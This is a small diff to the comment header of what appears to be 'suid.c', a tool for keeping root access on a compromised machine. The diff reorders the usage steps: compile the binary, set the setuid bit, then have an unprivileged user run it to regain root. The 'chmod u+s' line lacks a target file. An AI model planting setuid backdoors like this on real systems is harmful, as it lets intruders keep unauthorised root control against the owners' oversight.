@@ -1,10 +1,10 @@
 /*
 * If you manage to get root access to a system , than it might be a good idea
 * to maintain root access. It's as easy as compiling this binary... :
-* root@box:~ : su lame
+* root@box~: gcc suid.c -o suid && chmod u+s
+* root@box~: su lame
 * lame@box~: whoami
 * lame
-* gcc suid.c -o suid && chmod u+s
 * ./suid
 * root@box~:
 * whoami
